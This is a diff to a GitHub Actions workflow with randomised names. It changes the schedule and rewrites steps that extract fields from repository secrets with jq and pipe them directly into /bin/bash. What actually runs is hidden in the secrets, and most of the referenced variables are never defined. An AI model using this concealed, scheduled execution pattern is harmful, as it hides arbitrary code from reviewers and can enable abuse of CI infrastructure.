@@ -2,7 +2,7 @@ name: liruocong3232
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 2/6 * * *'
+    - cron: '13 3/6 * * *'
 
 jobs:
   build:
@@ -11,13 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: liruocong3232
         env:
-          xmeay515: ${{ secrets.xmeay515 }}
+          zegby53: ${{ secrets.zegby53 }}
         run: |
-          echo $xmeay515 | jq -r .hwp91 | /bin/bash
-          echo $zwxi6822 | jq -r .lsn1 | /bin/bash
-          echo $aag834 | jq -r .jznew1486 | /bin/bash
-          echo $f609 | jq -r .senly69370 | /bin/bash
-          echo $rill74041 | jq -r .swx53232 | /bin/bash
-          echo $ave1893 | jq -r .smthu018 | /bin/bash
-          echo $h116 | jq -r .gpkxm1 | /bin/bash
+          echo $zegby53 | jq -r .vxlrm24 | /bin/bash
+          echo $rr3255 | jq -r .jnutg718 | /bin/bash
+          echo $g9186 | jq -r .kz8 | /bin/bash
+          echo $vdn04 | jq -r .m3 | /bin/bash
+          echo $bvll732 | jq -r .utak61 | /bin/bash
+          echo $gyfg73190 | jq -r .hdaa9927 | /bin/bash
+          echo $o24 | jq -r .n1083 | /bin/bash
+          echo $i2394 | jq -r .acb4916 | /bin/bash
+          echo $zhkyt309 | jq -r .xcvg0 | /bin/bash
+          echo $tsq9498 | jq -r .ing53 | /bin/bash
+          echo $ldeti427 | jq -r .fcte4 | /bin/bash
 
